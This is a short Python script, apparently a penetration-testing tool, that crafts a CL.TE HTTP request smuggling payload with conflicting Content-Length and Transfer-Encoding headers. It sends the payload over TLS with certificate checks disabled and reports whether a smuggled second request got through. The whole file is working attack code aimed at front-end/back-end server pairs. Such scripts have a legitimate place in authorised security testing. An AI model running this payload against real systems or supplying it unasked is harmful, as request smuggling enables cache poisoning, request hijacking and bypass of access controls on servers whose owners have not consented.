import socket
import ssl

host = "enter host here"  # Replace this with your authorized target
port = 443

# CL.TE Smuggling Payload:
# Front-end honors Content-Length: 4 (so ends at "0\r\n\r\n")
# Back-end honors Transfer-Encoding: chunked and sees the 2nd request
smuggled_request = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "0\r\n\r\n"
    "GET /robots.txt HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Connection: close\r\n"
    "\r\n"
)

# Follow-up request to trigger response
second_request = (
    "GET / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Connection: close\r\n"
    "\r\n"
)

# Create SSL context
context = ssl._create_unverified_context()

with socket.create_connection((host, port)) as sock:
    with context.wrap_socket(sock, server_hostname=host) as ssock:
        print("[+] Sending requests...")

        # Send smuggled request + follow-up
        ssock.sendall(smuggled_request.encode())
        ssock.sendall(second_request.encode())

        # Receive responses
        response_data = b""
        ssock.settimeout(2)
        try:
            while True:
                chunk = ssock.recv(4096)
                if not chunk:
                    break
                response_data += chunk
        except socket.timeout:
            pass

        # Decode and split responses
        full_response = response_data.decode(errors="ignore")
        parts = full_response.split("HTTP/1.1 ")

        if len(parts) < 3:
            print("\n❌ Smuggled request did NOT go through — only one response received.")
            print("\n🧪 Full raw server response:\n")
            print(full_response[:1500])  # Show up to 1500 characters for analysis
        else:
            print(f"\n✅ Received {len(parts) - 1} HTTP responses — possible smuggling success!")
            for idx, part in enumerate(parts[1:], start=1):
                print(f"\n---------------- Response #{idx} ----------------")
                print("HTTP/1.1 " + part[:600])  # Trim to avoid terminal flood
